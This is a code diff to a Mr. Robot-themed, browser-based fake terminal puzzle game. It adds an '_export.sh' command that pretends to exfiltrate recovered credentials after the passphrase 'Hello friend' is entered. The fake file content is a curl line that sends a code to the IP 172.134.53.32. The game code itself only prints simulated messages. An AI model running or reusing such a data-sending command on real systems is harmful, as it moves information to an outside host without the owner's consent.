@@ -23,7 +23,8 @@ const configs = (() => {
         rmdir_help: "Remove directory, this command will only work if the folders are empty.",
         touch_help: "Change file timestamps. If the file doesn't exist, it's created an empty one.",
         sudo_help: "Execute a command as the superuser.",
-        beer_help: "Solve a Caesar cipher in a file.",
+        beer_help: "Solve a Rolling Caesar cipher in a file using a given key.",
+        export_help: "Exfiltrate the recovered credentials to Mr. Robot",
         welcome:
             "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n" +
             "@@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@\n" +
@@ -87,6 +88,7 @@ const configs = (() => {
             "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n" +
             "                                                                           \n" +
             "               FREE BEER IS HIDING HERE, HOW WILL YOU GET IT?              \n" +
+            "                    WHEN YOU ARE READY, RUN _export.sh                     \n" +
             "                                                                           ",
         internet_explorer_warning: "NOTE: I see you're using internet explorer, this website won't work properly.",
         welcome_file_name: "welcome_message.txt",
@@ -133,7 +135,8 @@ const files = (() => {
             "I wanted to save the world. EVILCORP. Most kids get scared shitless when they’re alone, but I wasn’t. I loved it.\n" +
             "I never want to be right about my hacks, but people always find a way to disappoint. EVILCORP. You hack people. I hack time.\n" +
             "EVILCORP is taking over, but not without me to stop it. It was not a song, It was her, she was stuck in my head.\n" +
-            "Give a man a gun and he can rob a bank. Give a man a beer and he can enjoy the party."
+            "Give a man a gun and he can rob a bank. Give a man a beer and he can enjoy the party.",
+        "_export.sh": "#/bin/sh\ncurl 172.134.53.32/submit?code={1}"
     };
     return {
         getInstance: options => {
@@ -172,7 +175,8 @@ const main = (() => {
         RMDIR: { value: "rmdir", help: c.rmdir_help },
         TOUCH: { value: "touch", help: c.touch_help },
         SUDO: { value: "sudo", help: c.sudo_help },
-        BEERCIPHER: { value: "cipher", help: c.beer_help }
+        BEERCIPHER: { value: "cipher", help: c.beer_help },
+        EXPORT: { value: "_export.sh", help: c.export_help },
     };
 
     var Terminal = function (prompt, cmdLine, output, sidenav, profilePic, user, host, root, outputTimer) {
@@ -342,6 +346,9 @@ const main = (() => {
             case cmds.BEERCIPHER.value:
                 this.beerCipher(cmdComponents);
                 break;
+            case cmds.EXPORT.value:
+                this.exfiltrate(cmdComponents);
+                break;
             case cmds.LS.value:
                 this.ls();
                 break;
@@ -392,6 +399,36 @@ const main = (() => {
     function mod(n, m) {
         return ((n % m) + m) % m;
     }
+
+    Terminal.prototype.exfiltrate = function (cmdComponents) {
+        const c = configs.getInstance();
+
+        if (cmdComponents.length === 1) {
+            this.type(`${c.usage}: ${cmds.EXPORT.value} <passphrase>`, this.unlock.bind(this));
+            return;
+        }
+
+        if (cmdComponents[1] === "Hello" && cmdComponents[2] === "friend") {
+            this.type(
+                "Submitting [.............................]\n\nSuccess. Contact Mr Robot for compensation.",
+                this.unlock.bind(this)
+            );
+        } else {
+            const responses = [
+                "bad password. don't fuck this up, we've got a lot riding on this.",
+                "don't fuck with me, tried it, bad password. try again.",
+                "dud, try it again.",
+                "submitting bad data is risky. you better know what you're doing",
+                "you fucked it. going dark for a while."
+            ];
+
+            const response = responses[Math.floor(Math.random() * responses.length)];
+
+            setTimeout(() => {
+                this.type(response, this.unlock.bind(this));
+            }, Math.random() * 2000);
+        }
+    };
 
     Terminal.prototype.beerCipher = function (cmdComponents) {
         let out = "";
